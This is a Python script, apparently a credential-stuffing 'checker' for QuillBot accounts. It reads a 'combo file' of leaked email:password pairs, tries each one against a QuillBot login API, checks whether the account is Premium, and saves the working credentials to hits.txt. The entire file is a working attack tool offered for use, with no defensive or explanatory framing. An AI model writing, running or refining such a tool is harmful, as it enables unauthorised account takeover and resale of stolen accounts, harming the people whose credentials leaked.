import requests
import os

def print_ascii_art():
    ascii_art = """
 ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄ ▄▄▄     ▄▄▄     ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ 
█       █  █ █  █   █   █   █   █   █  ▄    █       █       █
█   ▄   █  █ █  █   █   █   █   █   █ █▄█   █   ▄   █▄     ▄█
█  █ █  █  █▄█  █   █   █   █   █   █       █  █ █  █ █   █  
█  █▄█  █       █   █   █▄▄▄█   █▄▄▄█  ▄   ██  █▄█  █ █   █  
█      ██       █   █       █       █ █▄█   █       █ █   █  
█▄▄▄▄██▄█▄▄▄▄▄▄▄█▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█            
    
                                                 
    """
    print(ascii_art)

def quillbot_login(email, password):
    login_url = "https://quillbot.com/api/auth/login"  # Placeholder URL
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
    }

    payload = {
        "email": email,
        "password": password
    }

    response = requests.post(login_url, json=payload, headers=headers)

    if response.status_code == 200:
        data = response.json()
        if "token" in data:
            print(f"[SUCCESS] {email}:{password} - Logged in")
            # Check for account plan type
            plan = check_plan(data["token"])
            print(f"[INFO] Account Plan: {plan}")
            return f"{email}:{password} - {plan}"
        else:
            print(f"[FAIL] {email}:{password} - Invalid login")
    else:
        print(f"[ERROR] {email}:{password} - Login failed")

    return None

def check_plan(token):
    plan_url = "https://quillbot.com/api/account/status"  # Placeholder URL
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
    }

    response = requests.get(plan_url, headers=headers)
    
    if response.status_code == 200:
        account_info = response.json()
        return "Premium" if account_info.get("is_premium") else "Free"
    return "Unknown"

def main():
    print_ascii_art()
    print("Drag and drop your combo file below:")

    combo_path = input("> ").strip().strip('"')  # Remove leading/trailing whitespace and quotes

    if not os.path.exists(combo_path):
        print(f"[ERROR] Combo file at {combo_path} not found.")
        return
    
    with open(combo_path, "r") as file:
        combos = file.readlines()

    for combo in combos:
        email, password = combo.strip().split(":")
        result = quillbot_login(email, password)
        if result:
            with open("hits.txt", "a") as hits_file:
                hits_file.write(result + "\n")

if __name__ == "__main__":
    main()
